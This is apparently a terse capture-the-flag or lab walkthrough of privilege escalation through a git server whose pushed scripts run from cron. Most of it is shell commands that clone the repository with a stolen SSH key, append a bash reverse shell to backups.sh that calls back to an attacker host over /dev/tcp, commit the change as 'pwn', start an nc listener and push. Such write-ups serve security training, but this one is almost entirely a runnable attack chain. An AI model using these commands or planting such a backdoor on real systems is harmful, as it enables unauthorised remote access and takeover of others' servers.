- Initial access was found in the source code of a post and api request to /api/users
- SSH creds were found from the above one and noticed few suspicious cron jobs and git-shell with id_rsa
- Git-server was there in the server and we couldn't push changes to master with existing creds.
- followed below steps

```bash
 GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.120.204:/git-server
```

```bash
cd git-server
```

```bash
git config --global user.name "kali"
```

```bash
git config --global user.email "kali@kali.(none)"
```

```bash
echo "sh -i >& /dev/tcp/192.168.118.8/8080 0>&1" >> backups.sh 
```

```bash
chmod +x backups.sh
```

```bash
git add -A
```

```bash
git commit -m "pwn"
```


```bash
nc -lvnp 8080
```

```bash
GIT_SSH_COMMAND='ssh -i ~/id_rsa -p 43022' git push origin master
```
